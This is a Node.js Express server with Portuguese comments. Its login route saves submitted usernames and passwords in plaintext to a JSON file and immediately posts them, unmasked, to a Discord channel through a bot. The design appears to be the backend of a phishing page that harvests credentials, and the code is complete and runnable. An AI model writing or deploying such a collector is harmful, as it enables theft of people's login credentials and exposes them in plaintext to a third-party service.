const express = require('express');
const fs = require('fs');
const path = require('path');
const { Client, GatewayIntentBits } = require('discord.js');
require('dotenv').config();

const app = express();
// O Railway define a porta automaticamente na variável process.env.PORT
const PORT = process.env.PORT || 3000;
const FILE_PATH = path.join(__dirname, 'usuarios_registrados.json');

// --- MIDDLEWARES ---
// Processa requisições vindas de APIs em formato JSON
app.use(express.json());
// Processa requisições de formulários HTML normais (<form>)
app.use(express.urlencoded({ extended: true }));

// Serve os arquivos estáticos (HTML, CSS, Imagens) da pasta atual
app.use(express.static(__dirname));

// --- CONFIGURAÇÃO DO BOT DO DISCORD ---
const TOKEN = process.env.DISCORD_TOKEN;
const CANAL_LOG_ID = process.env.LOG_CHANNEL_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// Inicializa o bot do Discord se o token estiver presente
if (TOKEN) {
    client.login(TOKEN);
} else {
    console.log("Aviso: DISCORD_TOKEN não encontrado.");
}

client.once('ready', () => {
    console.log(`Bot conectado com sucesso como: ${client.user.tag}`);
});

// --- ROTA POST ---
// Recebe os dados do formulário, salva no JSON e envia IMEDIATAMENTE para o Discord
app.post('/api/salvar-login', (req, res) => {
    const novosDados = req.body;

    // Verifica se os campos obrigatórios foram enviados
    if (!novosDados.username || !novosDados.password) {
        return res.status(400).json({ erro: 'Dados incompletos.' });
    }

    // [Sua lógica original] Lê o arquivo existente ou cria uma nova lista caso não exista
    fs.readFile(FILE_PATH, 'utf8', (err, data) => {
        let listaUsuarios = [];

        if (!err && data) {
            try {
                listaUsuarios = JSON.parse(data);
            } catch (parseErr) {
                console.error("Erro ao ler JSON existente, reiniciando arquivo:", parseErr);
            }
        }

        // Adiciona o novo registro de login à lista de forma incremental
        listaUsuarios.push(novosDados);

        // Escreve la lista atualizada de volta no arquivo de texto .json
        fs.writeFile(FILE_PATH, JSON.stringify(listaUsuarios, null, 2), async (writeErr) => {
            if (writeErr) {
                console.error("Erro ao escrever no arquivo:", writeErr);
                return res.status(500).json({ erro: 'Erro interno ao salvar os dados.' });
            }

            console.log("Novo login registrado com sucesso no arquivo JSON!");

            // Envia os dados para o canal do Discord assim que o salvamento é concluído
            if (CANAL_LOG_ID && client.isReady()) {
                try {
                    const canal = await client.channels.fetch(CANAL_LOG_ID);
                    if (canal) {
                        const mensagem = 
                            `👤 **Novo Usuário Registrado!**\n` +
                            `📧 **Usuário:** \`${novosDados.username}\`\n` +
                            `🔑 **Senha:** \`${novosDados.password}\`\n` +
                            `────────────────`;
                        await canal.send(mensagem);
                        console.log("Log enviado com sucesso para o Discord!");
                    }
                } catch (discordErr) {
                    console.error("Erro ao mandar para o canal do Discord:", discordErr.message);
                }
            }

            // Retorna a resposta de sucesso para o formulário
            return res.status(200).json({ mensagem: 'Login processado com sucesso.' });
        });
    });
});

// Inicializa o servidor na porta configurada (Seja local ou no Railway)
app.listen(PORT, () => {
    console.log(`Servidor rodando com sucesso na porta: ${PORT}`);
});
